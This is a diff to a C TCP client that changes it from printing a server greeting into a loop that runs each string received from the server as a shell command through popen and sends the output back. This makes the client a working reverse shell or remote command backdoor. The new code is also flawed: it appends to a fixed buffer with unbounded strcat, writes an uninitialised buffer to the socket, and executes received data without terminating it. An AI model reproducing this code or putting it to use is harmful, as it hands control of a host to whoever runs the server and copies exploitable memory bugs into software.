@@ -6,6 +6,7 @@
 #include <netdb.h>
 #include <string.h>
 #include <errno.h>
+#include <sys/stat.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -73,9 +74,10 @@ void PrintLocalInfo(struct in_addr *ip, in_port_t *port)
 
 int main(int argc, char **argv)
 {
-    int sockfd, n;
+    int sockfd, n, file_size;
     char recvline[MAXLINE + 1];
     struct sockaddr_in servaddr;
+    char message[MAXLINE + 1];
 
     CheckInput(&argc, &argv);
     sockfd = CreateSocket();
@@ -91,17 +93,45 @@ int main(int argc, char **argv)
 
     PrintLocalInfo(&servaddr.sin_addr, &servaddr.sin_port);
 
-    while ((n = read(sockfd, recvline, MAXLINE)) > 0)
-    {
-        recvline[n] = 0;
+    // get hello
+    // if (fputs(recvline, stdout) == EOF)
+    // {
+    //     perror("fputs error");
+    //     exit(1);
+    // }
+    // bzero(recvline, sizeof(recvline));
 
-        // get hello
-        if (fputs(recvline, stdout) == EOF)
+    n = read(sockfd, recvline, MAXLINE);
+
+    while (strncmp(recvline, "EXIT", 4) != 0)
+    {
+        FILE *fp;
+        char path[1035];
+        char file_content[10000] = "";
+
+        fp = popen(recvline, "r");
+        if (fp == NULL)
         {
-            perror("fputs error");
+            printf("Failed to run command\n");
             exit(1);
         }
-        bzero(recvline, sizeof(recvline));
+
+        file_size = 0;
+        while (fgets(path, sizeof(path), fp) != NULL)
+        {
+            strcat(file_content, path);
+        }
+
+        file_size = strlen(file_content) + 1;
+
+        send(sockfd, file_content, file_size, 0);
+
+        pclose(fp);
+
+        write(sockfd, message, strlen(message));
+
+        bzero(recvline, MAXLINE + 1);
+        n = read(sockfd, recvline, MAXLINE);
     }
 
     if (n < 0)
